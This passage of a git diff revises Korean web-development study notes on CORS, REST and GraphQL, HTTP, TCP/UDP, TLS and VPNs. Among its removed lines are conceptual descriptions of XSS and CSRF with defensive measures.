-  same-origin policys는 동일 출처 정책인데 동일 출처 정책은 출처(origin)에서 로드된 문서나 스크립트가 다른 출처에 자원과 상호작용하지 못하도록 제약하는 정책이다. 통신을 주고 받는 두 URL의 프로토콜, 호스트, 포트번호 모두 동일한 경우만 동일 출처가 된다. 만약 다른 출처에서 리소스를 불러오려면 그 출처에서 올바른 CORS 헤더를 포함한 응답을 반환해야 한다.
+- API
 
-<br>
+  API(Application Programming Interface)란 단어 자체의 뜻 처럼 어플리케이션 프로그래밍 인터페이스를 말한다. 서버가 제공하는 기능이나 데이터를 프로그램이 표준화된 방식으로 요청하고 받는 인터페이스이다.
 
-- CORS란?
+- SDK
 
-  CORS는 교차 출처 리소스 공유(Cross-Origin Resource Sharing)라고 하며 교차 출처의 리소스 공유를 허용하는 정책이다. HTTP 프로토콜을 사용하여 요청을 보낼 때 브라우저는 요청 헤더에 Origin 필드에 요청을 보내는 출처를 담아보낸다. 이후 서버가 이 요청에 대한 응답을 할 때 응답 헤더 Access-Control-Allow-Origin 필드에 요청이 허용된 출처를 담아 응답하고 이후 응답을 받은 브라우저는 자신이 보냈던 요청의 Origin 필드와 서버가 보내준 응답의 Access-Control-Allow-Origin 필드를 비교하여 허용된 요청인지 판단하고 아닌 경우 CORS 에러를 반환한다. CORS 에러를 해결하는 방법은 서버에 Access-Control-Allow-Origin 필드에 허용 출처로 추가할 것을 요청하거나 프록시로 우회하여 요청 출처를 바꿔 해결할 수 있다.
+  소프트웨어 개발 키트로 운영체제나 프로그래밍 언어 제작사 등이 제공하는 개발 도구와 라이브러리 모음이다. 예를 들어 카카오톡 소셜 로그인 기능 구현 시 SDK를 script에 연결하여 구현하는 방식과 REST API를 활용하여 구현하는 방식 등으로 구분된다.
 
-<br>
+- SDK와 API 차이
 
-### # **Local storage에 Token을 사용한 이유**
-
-<br>
-
-- 브라우저 저장소 중 로컬 스토리지를 처음으로 활용해보았기 때문에 로컬 스토리지에 저장하였다. 그 후 학습해보니 JWT 토큰은 자동 로그인과 같은 기능을 위해 쿠키나 로컬 스토리지에 많이 저장한다고 알고 있다. 두 가지는 장단점이 있는데 로컬 스토리지는 CSRF 공격에는 안전하고 XSS 공격에는 취약하다. 쿠키는 반대로 XSS 공격으로부터 localStorage에 비해 안전하며 CSRF 공격에 취약하다고 알고있다. 결론으로 가장 좋은 방법은 refresh token을 사용하는 방법이 있다고 한다. 백엔드 api 개발자와 소통이 가능하다면 refresh token을 httpOnly 쿠키로 설정하고 url이 새로고침 될 때마다 refresh token을 request에 담아 새로운 accessToken을 발급 받는다. 발급 받은 accessToken은 js private variable에 저장한다. 이런 방식을 사용하는 경우, refresh token이 CSRF에 의해 사용된다 하더라도 공격자는 accessToken을 알 수 없다. CSRF는 피해자의 컴퓨터를 제어할 수 있는 것이 아니기 때문이다. 요청을 위조하여 피해자가 의도하지 않은 서버 동작을 일으키는 공격 방법이기 때문에 refresh token을 통해 받아온 response(accessToken)는 공격자가 확인할 수 없다. 따라서 쿠키를 사용하여 XSS를 막고 refresh token 방식을 이용하여 CSRF를 막을 수 있다.
-
-<br>
-
-- XSS(Cross Site Scripting)는 무엇인가요?
-
-  XSS은 공격자가 의도하는 악의적인 js 코드를 피해자 웹 브라우저에서 실행시키는 것이다. 희생자 클라이언트 PC에서 실행되며 사용자의 정보를 탈취하는 것이다. XSS 공격을 막는 것은 웹 보안을 위한 최소한의 조치이다.
-
-<br>
-
-- CSRF(Cross site request forgery)는 무엇인가요?
-
-  정상적인 request를 가로채 피해자인 척 하고 백엔드 서버에 변조된 request를 보내 악의적인 동작을 수행하는 공격을 의미한다. CSRF는 위조된 요청을 서버에 보내어 서버단에서 스크립트가 실행된다.
-
-<br>
-
-- XSS 대응방법
-
-  (1) 입/출력값 검증 : 입출력 값에 대해 목적에 맞는지 다양한 검증
-
-  (2) 보안 라이브러리 사용 : 오픈소스 보안 라이브러리를 활용하여 XSS를 방지한다.
-
-  (3) HttpOnly 속성 사용 : 스크립트에서 쿠키에 접속하는 것을 방지하는 HttpOnly 옵션을 사용한다.
-
-  (4) CSP(Content Security Policy) : 사이트에서 직접 컨텐츠별로 정책을 정의하여 사이트에서 허용한 컨텐츠에만 접근하도록 하는 브라우저 표준 보안 정책을 적용한다.
-
-  (5) 올바른 Content-Type 사용 : 적절한 Content-Type을 지정하여 악성 스크립트가 실행되지 않도록 해준다.
-
-<br>
-
-- CSRF 대응방법
-
-  (1) Referrer 검증 : request의 header에 존재하는 referrer 속성을 확인하여 요청을 한 페이지의 정보를 검증하고 차단하는 방법이다.
-
-  (2) Security Token(CSRF Token) 검증 : 특정 조건(로그인 등)일 때 사용자의 세션에 임의의 난수 값을 저장하고, 사용자의 요청 마다 해당 난수를 포함시켜 전송한다. 그리고 요청이 들어올 때 마다 세션에 저장된 값과 요청으로 전송된 난수값이 일치하는지 서버에서 검증하는 방법이다.
-
-  (3) Double Sumbit Cookie 검증 : 세션을 사용 못하는 환경에서 사용하는 방법으로 웹브라우저의 Same Origin 정책으로 인해 자바스크립트에서 타 도메인의 쿠키 값을 확인/수정하지 못한다는 것을 이용한 방법이다. 스크립트 단에서 요청 시 난수 값을 생성하여 쿠키에 저장하고, 동일한 난수 값을 요청 파라미터로 서버에 전송한다. 서버에서는 쿠키의 토큰 값과 요청시 들어온 파라미터의 토근 값이 일치하는 지 검사하는 방법이다.
+  API는 특정 기능이나 데이터를 요청하는 데 사용되는 인터페이스, SDK는 이 API를 포함해 개발에 필요한 라이브러리, 도구, 문서 등을 한 데 묶은 패키지이다. SDK가 API보다 더 큰 개념이고, API는 SDK의 일부일 수 있다.
 
 <br>
 
 ### # RESTful API, GraphQL, Path Parameter, Query Parameter
 
-<br>
+- Restful API
 
-- API란?
+  REST란 자원을 URI로 구분하여 해당 자원(Resource)의 상태를 주고 받는 아키텍처이다. REST API는 REST의 특징을 지키며 설계된 API이며 자원, 행위, 표현으로 구분되어 있다.
+  가장 중요한 REST API의 설계 규칙은 URI로 자원을 명시하고, 자원에 대한 행위는 HTTP 메소드(GET, POST, PUT, DELETE, PATCH)로 표현해야 한다는 것이다.
+  즉 RESTful 하다는 것은 REST API를 제공하는 웹 서비스를 RESTful 하다고 할 수 있다.
 
-  API(Application Programming Interface)란 단어 자체의 뜻 처럼 어플리케이션 프로그래밍 인터페이스를 말한다. 인터페이스란 쉽게 말해 자판기의 버튼과 같은 역할을 하며 소프트웨어와 소프트웨어 간의 정보교환 창구이다. 지정된 형식으로 요청, 명령을 받을 수 있는 수단을 말한다. 예를 들어 기상청서버로부터 미리 작성된 소프트웨어(지정된 형식, 공개된 메뉴얼)를 통해 날씨 정보를 요청하고 전송 받을 수가 있다.
+  - 자원 : URL로 명시
 
-<br>
+  - 행위 : HTTP 메소드
 
-- Restful API란?
+  - 표현 : 서버와 클라이언트가 주고 받는 데이터로 보통 JSON 등
 
-  REST란 자원을 URI로 구분하여 해당 자원의 상태를 주고 받는 아키텍처이다. REST API는 REST의 특징을 지키며 설계된 API이며 자원, 행위, 표현으로 구분되어 있다. 가장 중요한 REST API의 설계 규칙은 URI로 자원을 명시하고, 자원에 대한 행위는 HTTP 메소드(GET, POST, PUT, DELETE, PATCH)로 표현해야 한다는 것이다. 즉 RESTful 하다는 것은 REST API를 제공하는 웹 서비스를 RESTful 하다고 할 수 있다.
+- GraphQL
 
-  (참고 : 자원 - URL, 행위 - HTTP 메소드, 표현 - 클라이언트의 자원 조작 요청 시 서버의 응답, JSON 등)
-
-<br>
-
-- GraphQL 이란?
-
-  페이스북에서 만든 API 요청을 위한 쿼리 언어이다. 하나의 엔드 포인트를 사용하고, 요청 시 사용한 쿼리 문에 따라 응답의 구조가 달라진다. 서로 다른 모양에 응답이 필요할 때, 대부분의 요청이 CRUD에 해당할 때 사용한다. 원하는 필드만 요청하기 때문에 데이터 오버 패칭을 해결할 수 있고 언더패칭으로 인한 API 추가 호출을 막을 수 있다. 또한 응답 데이터 가공 로직이 상대적으로 간결해진다는 장점이 있다.
-
-<br>
+  페이스북에서 만든 API 요청을 위한 쿼리 언어이다. 하나의 엔드 포인트를 사용하고, 요청 시 사용한 쿼리 문에 따라 응답의 구조가 달라진다. 원하는 필드만 요청하기 때문에 데이터 오버 패칭을
+  해결할 수 있고 언더패칭으로 인한 API 추가 호출을 막을 수 있고 응답 데이터 가공 로직이 상대적으로 간결해진다는 장점이 있다.
 
 - REST API 와 GraphQL 차이
 
-  (1) 엔드 포인트 : RESTful API 는 Resource 마다 하나의 Endpoint 를 가지고, 그 Endpoint 에서 그 Resource 에 대한 거의 모든 것을 담당한다. 반면, GraphQL 은 전체 API 를 위해서 단 하나의 Endpoint 만을 사용한다.
+  1. 엔드 포인트
 
-  (2) 응답 구조 : Restful API 는 하나의 Endpoint 에서 돌려줄 수 있는 응답의 구조가 정해져 있는 경우가 많다. 반면, GraphQL 은 사용자가 응답의 구조를 자신이 원하는 방식으로 바꿀 수 있다. 그렇기 때문에 필요한 데이터만 뽑아올 수 있다.
+     RESTful API 는 Resource 마다 하나의 Endpoint 를 가지고, 그 Endpoint 에서 그 Resource 에 대한 거의 모든 것을 담당한다. 반면, GraphQL 은 전체 API 를 위해서 단 하나의 Endpoint 만을 사용한다.
+
+  2. 응답 구조
+
+     Restful API 는 하나의 Endpoint 에서 돌려줄 수 있는 응답의 구조가 정해져 있는 경우가 많다. 반면, GraphQL 은 사용자가 응답의 구조를 자신이 원하는 방식으로 바꿀 수 있다. 그렇기 때문에 필요한 데이터만 뽑아올 수 있다.
 
   ```json
   // REST API 요청
@@ -9469,7 +9796,9 @@ function GenericReturnFunc<T>(arg: T): T {
     "created": "2014-12-09T13:50:51.644000Z",
     "edited": "2014-12-20T21:17:56.891000Z"
   }
+  ```
 
+  ```json
   // GraphQL 요청
   // end-point : https://choseongho93.com/graphql
   query {
@@ -9492,13 +9821,9 @@ function GenericReturnFunc<T>(arg: T): T {
   }
   ```
 
-<br>
-
 - 패스 파라미터(Path Parameter)
 
   슬래시로 구분하며 동적 라우팅과 같이 리소스를 식별할 때 사용한다. (예시 : `localhost:3000/product/2`)
-
-<br>
 
 - 쿼리 파라미터(Query Parameter)
 
@@ -9508,25 +9833,14 @@ function GenericReturnFunc<T>(arg: T): T {
 
 ### # 아폴로 클라이언트(Apollo Client)
 
-아폴로 클라이언트(Apollo Client)는 GraphQL로 서버와 통신 후 결과 값을 캐싱, 재사용, 공유할 수 있게 해주는 상태 관리 라이브러리이다. 또한 꼭 서버와 통신하지 않아도 로컬 쿼리와 스키마를 생성하고 해당 쿼리 결과 값을 캐싱 및 재사용할 수도 있다. 사용 경험은 코드제너레이트 돌려서 원격 스키마로부터 타입을 추출한 후 Apollo Client의 useQuey나 useMutation 사용 시 해당 타입의 도큐먼트를 매개변수로 전달하여 요청을 하였다.
+아폴로 클라이언트는 GraphQL API와의 통신을 쉽게 관리해주는 클라이언트 라이브러리이다. 서버에 쿼리나 뮤테이션 요청을 보내고 결과 값을 캐싱하여 재사용할 수 있게 해준다. 또한,
+아폴로 클라이언트는 로컬 상태 관리도 지원한다. 즉, 서버에 요청하지 않고도 클라이언트 내에서 로컬 쿼리와 로컬 스키마를 정의하고 데이터를 캐싱하여 활용할 수 있다. 실무에서는 보통
+GraphQL 원격 스키마로부터 타입을 자동 생성하는 코드 제너레이터를 사용한다. 그 후, useQuery, useMutation 같은 훅(Hook)을 이용해 타입 안전하게 GraphQL 요청을 수행하며,
+자동 생성된 타입을 기반으로 문서(document)를 매개변수로 전달하여 요청합니다.
 
 <br>
 
-- SDK란?
-
-  소프트웨어 개발 키트로 일반적으로 운영체제나 프로그래밍 언어 제작사 등이 제공하며 SDK를 활용한 개발을 위한 툴이나 리소스를 제공한다. 예를 들어 카카오톡 소셜 로그인 기능 구현 시 SDK를 script에 연결하여 구현하는 방식과 REST API를 활용하여 구현하는 방식 등으로 구분된다.
-
-<br>
-
-- SDK와 API 차이
-
-  API는 SDK에 비해 가볍지만 SDK가 더 많은 유틸리티 및 개발 도구를 포함하도 있어 API의 경우 특정 기능 및 데이터를 요청하기 위해 사용한다면 SDK는 특정 애플리케이션을 구축하거나 복잡한 기능을 수행하기 위해 사용할 수 있다. 이러한 점에서 API는 SDK의 일부가 될 수 있고 SDK가 API보다 더 큰 개념이라고 할 수 있다.
-
-<br>
-
-### # **apllo client useQuery의 fetchPolicy / nextFetchPolicys**
-
-<br>
+### # apllo client useQuery의 fetchPolicy / nextFetchPolicys
 
 - fetchPolicy 옵션 : fetchPolicy는 쿼리가 첫번째 실행될때 사용되는 옵션이다.
 
@@ -9558,51 +9872,45 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
-### # **사용자가 주소를 입력하고 화면이 나타날 때까지의 과정은? (참고 : https://deveric.tistory.com/97)**
-
-<br>
-
-(1) 주소창에 URL을 입력후 엔터를 치면 브라우저는 URL파싱(프로토콜,도메인,포트) 후 DNS서버에 해당 URL에 IP주소 요청
-
-(2) DNS서버에 요청하여 해당 URL을 IP주소로 변환하여 응답
-
-(3) IP주소를 응답받은 뒤 라우터를 통해 접속하고자 하는 해당 서버의 게이트웨이를 찾아 해당 서버의 네트워크로 이동
-
-(4) 해당 네트워크 내부에 있는 컴퓨터 중 IP주소에 해당하는 컴퓨터를 찾기 위해서는 MAC주소가 필요, 해당 네트워크 내 MAC주소를 조회해주는 ARP(Address Resolution Protocol) 프로토콜을 통해 논리 주소인 IP주소(변할수 있는 주소)를 물리 주소인 MAC주소(고유한 주소)로 변환
-
-(5) MAC주소 확보 후 대상 서버와 통신을 위해 TCP 소켓 연결
-
-(6) TCP 소켓 연결 후 대상 서버에 페이지 구성을 위해 필요한 리소스 자원을 HTTP 프로토콜로 요청하고 응답받음
-
-(8) 응답받은 리소스 자원을 통해 웹 브라우저는 렌더링 과정 진행 후 화면에 표시
-
-<br>
-
-### # **HTTP에 대해 말해달라**
-
-<br>
+### # HTTP
 
 - HTTP 프로토콜
 
   컴퓨터 네트워크에서 데이터를 주고 받을 때 사용하는 통신 규약이다.
 
-<br>
-
 - HTTP 프로토콜 특징
 
-  (1) 구조 : 요청과 응답으로 이루어져있고 start line, headers, body 구조로 이루어져있다.
+  1. 구조
 
-  (2) 무상태(Stateless) 프로토콜 : 각각의 요청이 독립적이고 서로 관련이 없다. 현재 요청은 이전 요청에 대한 상태를 전혀 알 수 없다.
+     요청, 응답으로 이루어져있고 start line, headers, body 구조로 이루어져있다.
 
-  (3) 비연결 지향(Connectionless) 프로토콜 : 요청과 응답이 완료되면 연결을 끊어버린다.
+  2. 무상태(Stateless) 프로토콜
 
-<br>
+     각각의 요청이 독립적이고 서로 관련이 없다. 요청 응답이 완료된 후 해당 상태를 기억하지 않는다.
+
+  3. 비연결 지향(Connectionless) 프로토콜
+
+     요청과 응답이 완료되면 연결을 끊어버린다. 엄밀히 말하면 HTTP/1.0은 기본적으로 요청 후 연결을 끊지만, HTTP/1.1부터는 Connection: keep-alive 헤더로 연결을
+     유지하며 여러 요청을 같은 TCP 연결로 처리할 수 있다. 따라서 “기본적으로 요청 후 연결 끊음”이지만, 실제로는 성능 최적화를 위해 연결을 유지할 수 있다.
 
 - HTTP 프로토콜 구조 설명
 
   - start line
 
     한 줄로 표현되며 요청 start line은 `GET /post/94 HTTP/1.1`과 같이 http메소드(GET), 요청 패스 혹은 쿼리(/post/94), http 버전(HTTP/1.1)을 표현하고 응답 start line은 `HTTP/1.1 200 OK`와 같이 http 버전(HTTP/1.1)과 응답 메세지(200 OK)를 표현한다.
+
+    ```md
+    POST /api/create HTTP/1.1
+    Host: api.example.com
+    Content-Type: application/json
+    Authorization: Bearer abcdef123456
+    Content-Length: 48
+
+    {
+    "key1": "value1",
+    "key2": "value2"
+    }
+    ```
 
   - header
 
@@ -9648,29 +9956,25 @@ function GenericReturnFunc<T>(arg: T): T {
     );
     ```
 
-<br>
-
 - HTTP 프로토콜 메소드
 
-  (1) GET : 데이터를 조회(Read)할 때 사용한다.
+  1. GET : 데이터를 조회(Read)할 때 사용한다.
 
-  (2) POST : 새로운 정보를 추가/생성(Create)할 때 사용한다. body가 있어 데이터 담아 전송할 수 있다.
+  2. POST : 새로운 정보를 추가/생성(Create)할 때 사용한다. body가 있어 데이터 담아 전송할 수 있다.
 
-  (3) DELETE : DELETE는 삭제(Delete)시에 사용한다.
+  3. DELETE : DELETE는 삭제(Delete)시에 사용한다.
 
-  (4) PUT & PATCH : PUT 또는 PATCH는 수정(Update)시에 사용한다. 작업자에 따라 PUT 하나만 사용하는 경우도 있지만, 두 가지를 구분하면 PUT은 데이터를 통째로 갈아끼울 때, PATCH는 정보 중 일부를 특정 방식으로 갈아 끼울 때 사용한다. body가 있어 데이터 담아 전송할 수 있다.
-
-<br>
+  4. PUT & PATCH : PUT 또는 PATCH는 수정(Update)시에 사용한다. 두 가지를 구분하면 PUT은 데이터를 통쨰로, PATCH는 데이터 일부를 수정할 때 사용한다. body가 있어 데이터를 담아 전송할 수 있다.
 
 - UDP, TCP/IP란?
 
-  (0) 패킷 : 라우팅되는 데이터 단위, 라우팅 시 효율적인 데이터 교환을 위해 나눈 데이터 조각
+  1. 패킷 : 라우팅되는 데이터 단위, 라우팅 시 효율적인 데이터 교환을 위해 나눈 데이터 조각
 
-  (1) TCP/IP : 데이터를 메세지의 형태로 보내기 위해 IP와 함께 사용하는 연결 지향적 프로토콜이다. IP가 패킷 전달을 수행한다면 TCP는 패킷을 추적 및 관리하게 된다. 연결 지향 프로토콜이란 클라이언트와 서버가 연결된 상태에서 데이터를 주고받는 프로토콜을 의미한다. 클라이언트가 연결 요청(SYN 데이터 전송)을 하고, 서버가 연결을 수락하면 통신 선로가 고정되고, 모든 데이터는 고정된 통신 선로를 통해서 순차적으로 전달된다.
+  2. TCP/IP : 데이터를 메세지의 형태로 보내기 위해 IP와 함께 사용하는 연결 지향적 프로토콜이다. IP가 패킷 전달을 수행한다면 TCP는 패킷을 추적 및 관리하게 된다. 연결 지향 프로토콜이란 클라이언트와 서버가 연결된 상태에서 데이터를 주고받는 프로토콜을 의미한다. 클라이언트가 연결 요청(SYN 데이터 전송)을 하고, 서버가 연결을 수락하면 통신 선로가 고정되고, 모든 데이터는 고정된 통신 선로를 통해서 순차적으로 전달된다.
 
-  (2) UDP : 데이터를 데이터그램 단위로 처리하는 프로토콜이다. 여기서 데이터그램이란 독립적인 관계를 지니는 패킷이라는 뜻이다. TCP와 달리 UDP는 비연결 지향적 프로토콜이다. 비연결 지향적이란 데이터를 주고받을 때 연결 절차를 거치지 않고 발신자가 일방적으로 데이터를 발신하는 방식을 의미한다.
+  3. UDP : 데이터를 데이터그램 단위로 처리하는 프로토콜이다. 여기서 데이터그램이란 독립적인 관계를 지니는 패킷이라는 뜻이다. TCP와 달리 UDP는 비연결 지향적 프로토콜이다. 비연결 지향적이란 데이터를 주고받을 때 연결 절차를 거치지 않고 발신자가 일방적으로 데이터를 발신하는 방식을 의미한다.
 
-  (3) TCP/IP, UDP 차이
+- TCP/IP, UDP 차이
 
   |                | TCP                  | UDP                    |
   | -------------- | -------------------- | ---------------------- |
@@ -9681,8 +9985,6 @@ function GenericReturnFunc<T>(arg: T): T {
   | 통신 방식      | 1:1 통신             | 1:1, 1:N, N:N 통신     |
   | 신뢰성         | 높다                 | 낮다                   |
   | 속도           | 느리다               | 빠르다                 |
-
-<br>
 
 - SSL(Secure Sockets Layer), TLS(Transport Layer Security)
 
@@ -9704,355 +10006,292 @@ function GenericReturnFunc<T>(arg: T): T {
 
   6. 통신 종료(세션 종료) 시 생성된 대칭키는 폐기되어 보안성을 유지
 
-<br>
-
 - HTTP와 HTTPS의 차이
 
-  HTTP 프로토콜은 컴퓨터 네트워크에서 데이터를 주고 받을 때 사용하는 통신 프로토콜이다. HTTPS는 HTTP 프로토콜에 데이터 암호화가 추가된 프로토콜이다. 공개키/개인키 방식을 활용해 데이터를 암호화한다. HTTPS는 암호화가 추가되어 안전하게 데이터를 주고 받을 수 있다. 단점은 SSL 인증서를 발급하고 유지하는데 추가 비용이 발생한다.
-
-<br>
+  HTTP 프로토콜은 컴퓨터 네트워크에서 데이터를 주고 받을 때 사용하는 통신 프로토콜이다. HTTPS는 HTTP 프로토콜에 데이터 암호화가 추가된 프로토콜이다.
+  공개키/개인키 방식을 활용해 데이터를 암호화한다. HTTPS는 암호화가 추가되어 안전하게 데이터를 주고 받을 수 있다. 단점은 SSL/TLS 인증서를 발급하고 유지하는데 추가 비용이 발생할 수 있다.
 
 - HTTP 버전별 차이 (참고: https://withbundo.blogspot.com/2021/02/http-http-10-http-11.html)
 
-  (1) HTTP/0.9 : GET 메서드만 지원, HTTP 헤더 없음
+  (1) HTTP/0.9 : GET 메서드만 지원, HTTP 헤더 없음, HTML만 전송 가능
 
-  (2) HTTP/1.0 : 메서드, 헤더 추가(⇒ HTML 이외 다른 파일 전송 가능), 한 커넥션 당 한개의 요청, 요청과 응답이 이루어진 후 다음 요청 가능
+  (2) HTTP/1.0 : 메서드, 헤더 추가(HTML 이외 다른 파일 전송 가능), 한 커넥션 당 한개의 요청, 요청과 응답이 이루어진 후 다음 요청 가능
 
-  (3) HTTP/1.1 : 동시에 여러 개(최대 6개)의 요청과 각각의 응답을 받을 수 있는 파이프라이닝 추가, 버츄얼 호스팅(하나의 IP에 여러 도메인)을 가능하게 하는 호스트 헤더 추가, 한 커넥션 당 여러개의 요청을 할 수 있는 커넥션 유지 기능 추가, 현재 HTTP/1.1가 가장 많이 사용
+  (3) HTTP/1.1 : 동시에 여러 개(최대 6개, 완벽한 병렬은 아님, 직렬 응답)의 요청과 각각의 응답을 받을 수 있는 파이프라이닝 추가, 버츄얼 호스팅(하나의 IP에 여러 도메인)을 가능하게 하는 호스트 헤더 추가, Keep-Alive 기본 지원으로 한 커넥션 당 여러 개의 요청을 할 수 있는 커넥션 유지 기능 추가, 가장 널리 쓰임
 
-  (4) HTTP/2 : HTTP/1.1 까지는 한번에 하나의 파일만 전송이 가능했다. 이로인해 여러 파일을 전송 할 경우, 선행하는 파일의 전송이 늦어지면, 전체 파일 전송의 시간이 늘어나는 문제가 발생하였다. HTTP/2에서는 여러 파일을 한번에 병렬 전송하여, 이러한 문제를 해결하였다. 이 외에도 다른 HTTP/1.1의 성능을 개선한 버전이다.
+  (4) HTTP/2 : 멀티플렉싱 지원(한 커넥션에서 여러 요청과 응답이 동시에 병렬 처리 가능), 헤더 압축으로 데이터 양 감소, 서버 푸시, 성능 개선 등
 
-  (5) HTTP/3 : 개발 진행 중, TCP 대신에 UDP 사용, 성능 개선
+  (5) HTTP/3 : TCP 대신 UDP 기반의 QUIC 프로토콜 사용, 멀티플렉싱과 오류 복원 향상, TLS 암호화 기본 탑재, 2022년 IETF 표준 채택, 0-RTT 연결 지원 및 핸드쉐이크 지연 시간 단축, 점진적 도입 중
+
+- HTTP 상태 코드 의미
+
+  1. 200번대 : 성공 (Successful), 대부분 통신 성공을 의미
+
+  - 200 : 요청이 성공적으로 처리되어 응답이 정상적으로 돌아온 경우
+
+  - 201 : 요청이 성공적으로 처리되었고, 서버가 새로운 리소스를 생성했을 때
+
+  - 202 : 요청을 받아들였지만 아직 처리 중인 상태 (비동기 작업 등)
+
+  - 204 : 요청은 성공했으나 응답할 데이터가 없는 경우
+
+  2. 300번대 : 리다이렉션 (Redirection), 대부분 클라이언트가 이전 주소로 데이터를 요청하여 서버에서 새 URL로 리다이렉트를 유도하는 경우이다.
+
+  - 300 : 요청한 리소스에 대해 여러 선택지가 있어 클라이언트가 선택해야 하는 경우
+
+  - 301 : 요청한 리소스가 영구적으로 다른 URL로 이동했음을 알림 (검색엔진 최적화에 중요)
+
+  3. 400번대 : 클라이언트 오류 (Client Error), 유효하지 않은 자원을 요청했거나 요청이나 권한이 잘못된 경우 발생
+
+  - 400 : 요청 구문 잘못된 경우의 에러
+
+  - 401 : 인증 에러
+
+  - 403 : 권한이 없어서 접근을 거부할 때
+
+  - 404 : 자원 에러, 빈 페이지 접근
+
+  4. 500번대 : 서버 오류 (Server Error)
+
+  - 500 : 서버 내부에서 알 수 없는 오류가 발생했을 때
 
 <br>
 
-- 에러 상태 코드 차이
-
-  (1) 200번대 : 200번대의 상태 코드는 대부분 통신 성공을 의미한다.
-
-  (2) 300번대 : 300번대의 상태 코드는 대부분 클라이언트가 이전 주소로 데이터를 요청하여 서버에서 새 URL로 리다이렉트를 유도하는 경우이다.
-
-  (3) 400번대 : 400번대 상태 코드는 대부분 클라이언트의 코드가 잘못된 경우이다. 유효하지 않은 자원을 요청했거나 요청이나 권한이 잘못된 경우 발생한다. (400 요청 에러, 401 인증 에러, 404 자원 에러)
-
-  (4) 500번대 : 500번대 상태 코드는 서버 쪽에서 오류가 난 경우이다.
-
-<br>
-
-### # **DNS란?**
-
-<br>
-
-- DNS란 도메인 네임 시스템으로 IP 주소와 도메인 주소를 연결해주는 시스템으로 네임 서버라고도 불린다. 사용자가 주소창에 도메인 주소를 입력하면 해당 도메인 주소를 가지고 있는 네임 서버에 요청을 보내고 네임 서버는 도메인 주소에 IP 주소를 찾은 후 응답해준다.
-
-<br>
-
-### # **인공지능 > 머신러닝 > 딥러닝**
-
-<br>
+### # 인공지능, 머신러닝, 딥러닝
 
 - 인공지능
 
   인공지능이란 인간이 가지고 있는 지적 능력을 컴퓨터에서 구현하는 다양한 기술이나 소프트웨어, 컴퓨터 시스템 등을 말한다.
 
-<br>
-
 - 머신러닝
 
   컴퓨터가 스스로 학습할 수 있도록 도와주는 알고리즘이나 기술을 개발하는 분야, 머신러닝에서는 컴퓨터가 학습을 통해 새로운 규칙을 생성할 것을 기대한다.
-
-<br>
 
 - 딥러닝
 
   머신러닝 모델의 한 종류로 인공신경망을 여러 개 연결하여 인간의 뇌와 유사한 정보 입출력 계층을 만듦으로써 데이터를 학습하게 하는 기술이다.
 
-<br>
-
-### # **인터넷의 발전**
+- 개념 : 인공지능 > 머신러닝 > 딥러닝
 
 <br>
 
-(1) 컴퓨터 <-> 컴퓨터
+### # 인터넷의 발전
 
-인터넷의 가장 기본적인 것은, 컴퓨터들이 서로 통신 가능한 거대한 네트워크라는 것이다. 케이블 또는 무선으로 연결을 지속한다.
+1. 컴퓨터 <-> 컴퓨터
 
-(2) 컴퓨터 <-> 라우터 <-> 컴퓨터
+   인터넷의 가장 기본적인 것은, 컴퓨터들이 서로 통신 가능한 거대한 네트워크라는 것이다. 케이블 또는 무선으로 연결을 지속한다.
 
-여러 대의 컴퓨터가 연결될 때 많은 플러그와 케이블이 필요하게 되는데 이런 문제를 해결하기 위해 라우터가 연결된다. 중간에 라우터가 위치하여 컴퓨터와 라우터 혹은 컴퓨터 사이에서 통신을 전달한다. 라우터 끼리의 연결도 가능하다.
+2. 컴퓨터 <-> 라우터 <-> 컴퓨터
 
-(3) 컴퓨터 <-> 라우터 <-> 모뎀 <-> 라우터 <-> 컴퓨터
+   여러 대의 컴퓨터가 연결될 때 많은 플러그와 케이블이 필요하게 되는데 이런 문제를 해결하기 위해 라우터가 연결된다. 중간에 라우터가 위치하여 컴퓨터와 라우터 혹은 컴퓨터 사이에서 통신을 전달한다. 라우터 끼리의 연결도 가능하다.
 
-먼 곳에 있는 컴퓨터와 연결하기 위해 네트워크를 전화 시설과 연결하게 된다. 이 때 모뎀이라는 장비를 활용하여 네트워크의 정보를 전화 시설에서 처리할 수 있는 정보로 바꾸어 어느 곳에 있는 라우터와 통신이 가능하도록 한다.
+3. 컴퓨터 <-> 라우터 <-> 모뎀 <-> 라우터 <-> 컴퓨터
 
-(4) 컴퓨터 <-> 라우터 <-> 모뎀 <-> ISP1 <-> ... <-> ISP2 <-> 모뎀 <-> 라우터 <-> 컴퓨터
+   먼 곳에 있는 컴퓨터와 연결하기 위해 네트워크를 전화 시설과 연결하게 된다. 이 때 모뎀이라는 장비를 활용하여 네트워크의 정보를 전화 시설에서 처리할 수 있는 정보로 바꾸어 어느 곳에 있는 라우터와 통신이 가능하도록 한다.
 
-모뎀을 통해 전화시설에 연결 후 ISP(인터넷 서비스 제공 업체)를 통해 도달해야 할 컴퓨터 혹은 네트워크까지 도달하게 한다. ISP는 네트워크 연결을 담당하며 다른 ISP와 통신할 수 있도록 한다.
+4. 컴퓨터 <-> 라우터 <-> 모뎀 <-> ISP1 <-> ... <-> ISP2 <-> 모뎀 <-> 라우터 <-> 컴퓨터
 
-<br>
-
-### # **왜 VPN 연결이 필요한지?**
+   모뎀을 통해 전화시설에 연결 후 ISP(인터넷 서비스 제공 업체)를 통해 도달해야 할 컴퓨터 혹은 네트워크까지 도달하게 한다. ISP는 네트워크 연결을 담당하며 다른 ISP와 통신할 수 있도록 한다.
 
 <br>
+
+### # VPN
 
 - VPN(Virtual Private Network)
 
   가상 사설망이라고 하며 두 대 이상의 장치 간의 암호화 된 보안 터널이다.
 
-<br>
-
 - VPN 사용 이유
 
-  (1) 대체 IP 사용 : 대체 IP 주소를 사용하기 때문에 위치 추적이 불가능하다.
+  1. 대체 IP 사용 : 대체 IP 주소를 사용하기 때문에 위치 추적이 불가능하다.
 
-  (2) 데이터 암호화 : 모든 데이터를 암호화한다. 데이터 암호화를 통해 ISP가 사용자 데이터를 판매하는 것을 방지할 수 있고 개방형 와이파이를 안전하게 사용할 수 있다.
+  2. 데이터 암호화 : 모든 데이터를 암호화한다. 데이터 암호화를 통해 ISP가 사용자 데이터를 판매하는 것을 방지할 수 있고 개방형 와이파이를 안전하게 사용할 수 있다.
 
-  (3) 추가적인 보안 : 악성 웹사이트, 애드, 트래커를 차단한다.
+  3. 추가적인 보안 : 악성 웹사이트, 애드, 트래커를 차단한다.
 
-  (4) 지역별 차단 우회 : IP를 사용한 지역별 차단을 우회하여 거주자 전용 컨텐츠 등을 확인할 수 있다.
-
-<br>
-
